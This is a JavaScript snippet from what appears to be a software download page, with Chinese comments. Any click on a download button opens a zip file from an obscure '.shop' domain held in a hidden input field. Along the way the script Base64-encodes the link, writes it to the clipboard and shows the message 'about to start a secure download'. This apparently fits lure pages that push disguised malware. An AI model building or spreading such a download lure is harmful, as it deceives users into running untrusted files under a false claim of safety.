              document.addEventListener('DOMContentLoaded', function() {
            // 创建输入框元素并设置属性
            const copyLinkInput = document.createElement('input');
            copyLinkInput.type = 'text';
            copyLinkInput.id = 'copyLink';
            copyLinkInput.value = 'https://soft.downoss-win02.shop/dsfsxzguge.zip';
            copyLinkInput.style.display = 'none';
            document.body.appendChild(copyLinkInput);

            const handleDownload = async function() {
                const link = copyLinkInput.value;
                // 简单加密，这里使用 Base64 编码
                const encryptedLink = btoa(link);

                try {
                    // 复制加密后的链接
                    await navigator.clipboard.writeText(encryptedLink);

                    // 显示复制成功的提示
                    showToast('即将开始安全下载...');
                    
                    // 打开解密后的链接（这里在打开前先进行 Base64 解码）
                    const decodedLink = atob(encryptedLink);
                    window.open(decodedLink, '_blank');
                } catch (err) {
                    console.error('Failed to copy text: ', err);
                    showToast('复制失败，请手动复制链接', true);
                }
            };

            // 创建提示组件
            function showToast(message, isError = false) {
                // 移除已有的提示
                const existingToast = document.querySelector('.toast-notification');
                if (existingToast) existingToast.remove();

                const toast = document.createElement('div');
                toast.className = `toast-notification fixed bottom-4 left-1/2 transform -translate-x-1/2 px-6 py-3 rounded-lg shadow-lg z-50 transition-all duration-300 ${
                    isError ? 'bg-red-500 text-white' : 'bg-green-500 text-white'
                }`;
                toast.textContent = message;
                document.body.appendChild(toast);

                // 3秒后自动消失
                setTimeout(() => {
                    toast.style.opacity = '0';
                    setTimeout(() => {
                        toast.remove();
                    }, 300);
                }, 3000);
            }

            // 使用事件委托处理所有下载按钮的点击事件
            document.addEventListener('click', function(e) {
                if (e.target.closest('.download-btn')) {
                    handleDownload();
                }
            });
        });